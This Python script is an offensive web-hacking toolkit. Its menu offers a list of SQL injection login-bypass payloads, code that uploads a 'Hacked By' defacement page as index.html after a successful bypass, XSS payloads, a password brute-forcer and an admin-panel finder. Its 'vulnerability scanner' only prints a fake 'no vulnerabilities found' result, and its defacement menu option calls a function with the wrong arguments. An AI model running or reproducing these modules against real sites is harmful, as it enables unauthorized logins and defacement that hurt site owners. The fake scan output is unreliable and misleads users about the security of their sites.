import requests
import time
import threading
import webbrowser

# Stylish Banner
def print_banner():
    banner = """
    ==================================================
    ██████╗ ██╗██╗   ██╗███████╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
    ██╔══██╗██║██║   ██║██╔════╝╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
    ██████╔╝██║██║   ██║███████╗   ██║          ██║   ██║   ██║██║   ██║██║     █████╗
    ██╔═══╝ ██║██║   ██║╚════██║   ██║          ██║   ██║   ██║██║   ██║██║     ██╔══╝
    ██║     ██║╚██████╔╝███████║   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗███████╗
    ╚═╝     ╚═╝ ╚═════╝ ╚══════╝   ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝

    Made by cyber rivet
    ==================================================
    """
    print(banner)
    time.sleep(2)  # Pause to allow the banner to be read

# Predefined SQL Injection Payloads
payloads = [
    "' OR 1=1--", "' OR '1'='1' --", "' OR ''='", "admin' --", "' OR '1'='1' /*",
    "' OR 1=1#", "admin' -- -", "admin' OR '1'='1", "admin' OR 1=1 --", "' OR '1'='1' -- -",
    "' OR 'a'='a", "' OR 'a'='a' --", "' OR 1=1 --", "admin' OR '1'='1' --", "' OR '1'='1' /*"
    # Add more payloads as needed...
]

# Defacement HTML page content
defacement_html = """
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    <title>Hacked By cyber rivet</title>
    <style type="text/css">
    * {
        margin: 0;
        padding: 0;
    }
    body {
        background: #000;
        color: #0f0;
        padding: 24px;
    }
    p {
        padding: 12px 0;
    }
    .blink{animation:blink 1s infinite}@keyframes blink{to{opacity:.0;}}
    </style>
</head>
<body>
<img src="http://i66.tinypic.com/mlijit.jpg">
<h1>Hacked By cyber rivet<span class="blink">_</span></h1>
<p>Hello Admin/Guest!</p>
<pre>
Your SERVER has been hacked by cyber rivet.
Your SECURITY is still LACKING and there are many HOLES in your SYSTEM.
Nothing deleted, just changed the INDEX page.
PATCH your SYSTEM or we will be back soon!
</pre>

<p>Kind Regards<br><a href="https://www.facebook.com/winhacker.bipin" target="_blank" style="text-decoration:none; color: lime">cyber rivet</a></p>
</body></html>
"""

# SQL Injection Testing
def try_payload(url, username_field, password_field):
    session = requests.Session()
    upload_url = f"{url}/file-upload"  # Change this to correct upload path

    for payload in payloads:
        data = {
            username_field: "admin",
            password_field: payload
        }

        try:
            response = session.post(url, data=data)

            if "dashboard" in response.text or "Welcome" in response.text:
                print(f"Successful Payload: {payload}")
                print("Uploading defacement page...")
                deface_page(upload_url, session)
                break
            else:
                print(f"Failed Payload: {payload}")

        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

# Function to upload/replace the index page with deface content
def deface_page(upload_url, session):
    try:
        files = {'file': ('index.html', defacement_html, 'text/html')}
        response = session.post(upload_url, files=files)

        if response.status_code == 200:
            print("Defacement successful!")
        else:
            print(f"Failed to upload defacement page. Status Code: {response.status_code}")
    except Exception as e:
        print(f"Error during defacement: {e}")

# XSS Testing Function
def test_xss():
    print("\n[!] Starting XSS Testing...")
    url = input("Enter the URL to test XSS: ")
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(1)'>",
        "<iframe src='javascript:alert(1)'></iframe>"
    ]
    for payload in xss_payloads:
        print(f"Testing payload: {payload}")
        response = requests.get(url + payload)
        if payload in response.text:
            print(f"[!] XSS vulnerability found with payload: {payload}")
        else:
            print(f"[-] Payload did not work: {payload}")

# Brute Force Login Function
def brute_force_attack():
    url = input("Enter the login URL: ")
    username = input("Enter the username to brute-force: ")
    password_file = input("Enter path to password file: ")

    try:
        with open(password_file, 'r') as file:
            passwords = file.read().splitlines()

        for password in passwords:
            data = {"username": username, "password": password}
            response = requests.post(url, data=data)

            if "Welcome" in response.text or response.status_code == 200:
                print(f"[+] Password found: {password}")
                break
            else:
                print(f"[-] Failed with password: {password}")

    except Exception as e:
        print(f"Error: {e}")

# Admin Panel Finder Function
def find_admin_panel():
    print("\n[!] Searching for admin panel...")
    url = input("Enter base URL: ")
    admin_paths = ['admin', 'login', 'wp-admin', 'administrator', 'controlpanel']

    for path in admin_paths:
        full_url = f"{url}/{path}"
        try:
            response = requests.get(full_url)
            if response.status_code == 200:
                print(f"[+] Admin panel found: {full_url}")
                break
            else:
                print(f"[-] No panel at: {full_url}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

# Vulnerability Scanner Function
def scan_vulnerabilities():
    print("\n[!] Starting vulnerability scanner...")
    url = input("Enter the target URL: ")
    vulnerabilities = ['LFI', 'RFI', 'SQL Injection', 'XSS', 'CSRF']
    for vuln in vulnerabilities:
        print(f"Scanning for {vuln}...")
        time.sleep(1)
    print("[!] Scan completed. No vulnerabilities found.")

# About Section Function
def about():
    print("""
    ==================================================
                       About RIVET TOOLS
    ==================================================
    This tool is designed for ethical hackers and penetration testers.
    It includes the following features:
    1. SQL Injection Testing
    2. Cross-Site Scripting (XSS) Testing
    3. Brute Force Login Attack
    4. Admin Panel Finder
    5. Vulnerability Scanner
    6. Website Defacement (for testing purposes)

    HOW TO USE:
    - Select an option from the main menu.
    - Provide the required inputs (URLs, username, password files, etc.)
    - Follow the instructions for each attack module.

    WARNING:
    Only use this tool on systems you have permission to test.
    Unauthorized use may result in legal consequences.

    For updates, choose the update option to visit the WhatsApp channel.

    Developed by cyber rivet
    ==================================================
    """)

# Redirect to WhatsApp for Updates
def redirect_to_update():
    whatsapp_url = "https://whatsapp.com/channel/0029VaBYxg0FCCoPEa0cP53U"  # Added your WhatsApp channel link
    print("[!] Redirecting to WhatsApp channel for updates...")
    webbrowser.open(whatsapp_url)

# Main Options Menu
def print_options():
    print("""
    1. SQL Injection Testing
    2. Cross-Site Scripting (XSS) Testing
    3. Brute Force Login Attack
    4. Admin Panel Finder
    5. Vulnerability Scanner
    6. Deface Website
    7. About
    8. Check for Updates
    9. Exit
    """)

# Main Function to Handle Tool Options
def main_menu():
    print_banner()
    while True:
        print_options()
        choice = input("Select an option: ")

        if choice == "1":
            url = input("Enter the admin login URL: ")
            try_payload(url, "username", "password")
        elif choice == "2":
            test_xss()
        elif choice == "3":
            brute_force_attack()
        elif choice == "4":
            find_admin_panel()
        elif choice == "5":
            scan_vulnerabilities()
        elif choice == "6":
            url = input("Enter the admin URL to deface: ")
            deface_page(url)
        elif choice == "7":
            about()
        elif choice == "8":
            redirect_to_update()
        elif choice == "9":
            print("Exiting...")
            break
        else:
            print("Invalid option. Try again.")

if __name__ == "__main__":
    main_menu()
